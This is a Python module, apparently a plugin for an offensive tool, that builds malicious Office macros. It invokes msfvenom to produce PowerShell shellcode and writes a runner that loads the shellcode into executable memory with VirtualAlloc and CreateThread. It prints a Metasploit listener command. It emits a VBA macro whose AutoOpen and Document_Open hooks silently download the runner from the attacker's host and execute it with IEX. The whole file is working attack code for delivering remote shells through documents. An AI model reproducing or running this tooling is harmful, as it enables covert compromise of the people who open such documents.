import subprocess
import re
import os
import shutil
import sys
from colorama import Fore, Style

metadata = {
    "name": "PS1MacroRunnerObf",
    "description": "Obfuscated macro that downloads and runs a PowerShell shellcode runner.",
    "parameters": ["payload", "lhost", "lport"]
}

def _extract_shellcode(raw):
    match = re.search(r'\[Byte\[\]\] \$buf = (.*)', raw, re.DOTALL)
    return match.group(1).strip() if match else None

def _prompt_shellcode():
    print(Fore.YELLOW + "    Type 'EOF' on a new line to finish." + Style.RESET_ALL)
    data = []
    while True:
        try:
            line = input()
        except EOFError:
            break
        if line.strip().upper() == "EOF":
            break
        data.append(line)
    return "\n".join(data)

def _extract_output_filename():
    if "--output" in sys.argv:
        idx = sys.argv.index("--output")
        if idx + 1 < len(sys.argv):
            return sys.argv[idx + 1]
    return None

def generate_macro_code(params):
    payload = params.get("payload")
    lhost = params.get("lhost")
    lport = params.get("lport")
    output = _extract_output_filename()

    if not payload or not lhost or not lport or not output:
        raise ValueError("Missing required parameters: --payload, --lhost, --lport, or --output")

    base_name = os.path.splitext(output)[0]
    ps1_name = base_name + ".ps1"
    command = ["msfvenom", "-p", payload, f"LHOST={lhost}", f"LPORT={lport}", "EXITFUNC=thread", "-f", "ps1"]

    try:
        if not shutil.which("msfvenom"):
            print(Fore.RED + "[!] msfvenom not found on this system.\n" + Style.RESET_ALL)
            print(Fore.CYAN + "[*] Run the following command on a machine with Metasploit installed:\n")
            suggest = f"msfvenom -p {payload} LHOST={lhost} LPORT={lport} EXITFUNC=thread -f ps1"
            print(Fore.YELLOW + f"    {suggest}\n")
            listener = f'msfconsole -q -x "use exploit/multi/handler; set PAYLOAD {payload}; set LHOST {lhost}; set LPORT {lport}; set ExitOnSession false; exploit -j"'
            print(Fore.GREEN + "[*] Start the Metasploit listener with:\n")
            print(Fore.YELLOW + f"    {listener}\n")
            print(Fore.CYAN + "[*] After executing it, paste the full output below.")
            shellcode_raw = _prompt_shellcode()
            shellcode = _extract_shellcode(shellcode_raw)
            if not shellcode:
                raise ValueError("Could not extract shellcode from pasted input.")
        else:
            result = subprocess.run(command, capture_output=True, text=True)
            if result.returncode != 0:
                raise RuntimeError("msfvenom failed:\n" + result.stderr)
            shellcode = _extract_shellcode(result.stdout)
            if not shellcode:
                raise ValueError("Could not extract shellcode from msfvenom output.")

        with open(ps1_name, "w") as f:
            f.write(f"""[Byte[]] $x = {shellcode}

$K = @"
using System;
using System.Runtime.InteropServices;
public class K {{
    [DllImport("kernel32")] public static extern IntPtr VirtualAlloc(IntPtr a, uint s, uint f, uint p);
    [DllImport("kernel32")] public static extern IntPtr CreateThread(IntPtr a, uint b, IntPtr c, IntPtr d, uint e, IntPtr f);
    [DllImport("kernel32.dll", SetLastError=true)] public static extern UInt32 WaitForSingleObject(IntPtr h, UInt32 t);
}}
"@

Add-Type $K
$z = $x.Length
[IntPtr]$m = [K]::VirtualAlloc(0, $z, 0x3000, 0x40)
[System.Runtime.InteropServices.Marshal]::Copy($x, 0, $m, $z)
$h = [K]::CreateThread(0, 0, $m, 0, 0, 0)
[K]::WaitForSingleObject($h, [uint32]"0xFFFFFFFF")
""")

    except Exception as e:
        return f"{Fore.RED}Error: {e}{Style.RESET_ALL}"

    # Obfuscated macro that executes the PS1 from a remote source
    macro = f'''
Sub a()
    Dim t As String
    t = "powershell (New-Object Net.WebClient).DownloadString('http://{lhost}/{ps1_name}') | IEX"
    Shell t, vbHide
End Sub

Sub AutoOpen()
    Call a
End Sub

Sub Document_Open()
    Call a
End Sub
'''.strip()

    return macro
